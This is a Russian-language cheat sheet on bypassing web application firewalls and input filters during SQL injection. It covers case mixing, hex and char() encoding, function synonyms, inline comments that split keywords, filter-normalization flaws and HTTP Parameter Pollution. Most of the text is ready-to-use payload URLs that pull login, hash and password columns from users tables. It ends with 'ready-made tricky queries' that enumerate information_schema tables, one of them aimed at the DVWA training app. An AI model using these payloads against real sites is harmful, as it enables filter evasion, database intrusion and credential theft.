Обход фильтров путем изменения регистров

Рассмотрим ситуацию, когда Вы хотите обнаружить SQL-инъекцию, и вводите выражение «and 1=1». 
Его можно заменить на «aNd 777=777», или «anD 555=555». 
Как видите, изменились некоторые символы на заглавные, и выражение будет выполнено, даже если это слово находится в черном списке сайта

По-аналогии можно рассмотреть выражение «order by», которое примет вид: «oRdeR bY 1». Оно также будет выполняться, выполняя обход фильтров.

UNION SELECT по аналогии будет преобразован в uNiOn+SeLecT+1,2+%23

Использовать кодированное передаваемых данных в приложение
• Строка «qwerty» может быть представлена неограниченным количеством вариаций
Hex-кодирование: 0x717765727479
ASCII-представление: char(113),char(119),char(101),char(114),char(116),char(121)
Использование шифрования с разным ключом: ╧i╘═╗Г▐╗щ~)°°Р=
• Пример:
hex(AES_ENCRYPT('qwerty',1)) – это B969A9A01DA8E78FA8DD7E299C9CF23D
aes_decrypt(concat(0xB9,0x69,0xA9,0xA0,0x1D,0xA8,0xE7,0x8F,0xA8,0xDD,0x7E,0x29,0x9C,0x9C,0xF2,0x3D),1) – это qwerty

Использовать представления отсутствующие в фильтре
• Синонимы функций
CHARACTER_LENGTH() -> CHAR_LENGTH()
LOWER() -> LCASE()
OCTET_LENGTH() -> LENGTH()
LOCATE() -> POSITION()
REGEXP() -> RLIKE()
UPPER() -> UCASE()

Пример по обходу сигнатур (обфускация запроса)
• Следующий запрос попадает в сигнатуру приложения
/?id=1+union+(select+1,2+from+test.users)
• Но иногда используемые сигнатуры можно обойти
/?id=1+union+(select+'xz'from+xxx)
/?id=(1)unIon(selEct(1),mid(hash,1,32)from(test.users))
/?id=1+union+(sELect'1',concat(login,hash)from+test.users)
/?id=(1)union(((((((select(1),hex(hash)from(test.users))))))))
/?id=(1);exec('sel'+'ect'(1))
/?id=(1)or(0x50=0x50)

Пример распространенной уязвимости в функциях фильтров безопасности
• Следующий запрос не позволяет провести атаку
/?id=1+union+select+1,2,3/*
• Если в фильтре есть соответствующая уязвимость, то такой запрос успешно отработает
/?id=1+un/**/ion+sel/**/ect+1,2,3--
uNiOn/**/sElEct/**/1,2,3/**/%23
• SQL-запрос примет вид
SELECT * from table where id =1 union select 1,2,3--
Вместо конструкции /**/ может использоваться любые наборы символов, вырезаемые фильтром (eq #####, %00, etc)
Данный пример работает в случае «излишней очистки» поступающих данных (замена regexp-выражения на пустую строку)

Пример уязвимости в функции нормализации запроса
• Следующий запрос не позволяет провести атаку
/?id=1+union+select+1,2,3/*
• Если в WAF есть соответствующая уязвимость, то такой запрос успешно отработает
/?id=1/*union*/union/*select*/select+1,2,3/*
• После обработки WAF запрос примет следующий вид
index.php?id=1/*uni X on*/union/*sel X ect*/select+1,2,3/*
Данный пример работает в случае «очистки» опасного трафика, а не при блокировке всего запроса или источника атаки

Использование HTTP Parameter Pollution (HPP)
• Следующий запрос не позволяет провести атаку
/?id=1;select+1,2,3+from+users+where+id=1--
• Такой запрос успешно отработает при использовании HPP
/?id=1;select+1&id=2,3+from+users+where+id=1--

Использование HTTP Parameter Pollution (HPP)
• Уязвимый код
SQL="select key from table where id="+Request.QueryString("id")
• Такой запрос успешно отработает при использовании техники HPP
/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users
• SQL запрос примет вид
select key from table where id=1/**/union/*,*/select/*,*/pwd/*,*/from/*,*/users

Готовые хитрые запросы:
1'+uNiOn/**/sEleCt/**/table_name, 2+fRom information_schema.tables%23
1'+uNiOn/**/sEleCt/**/table_name, 2+fRom information_schema.tables+limit+1,2%23 (limit необходим если веб сайт настроен ограничивать выдачу ответов на запросы одним. Обозначая limit мы выбираем какой из ответов мы хотим видеть на экране)
1'+uNiOn/**/sEleCt/**/table_name, 2+fRom information_schema.tables+where+table_schema='dvwa'+limit+1,2%23
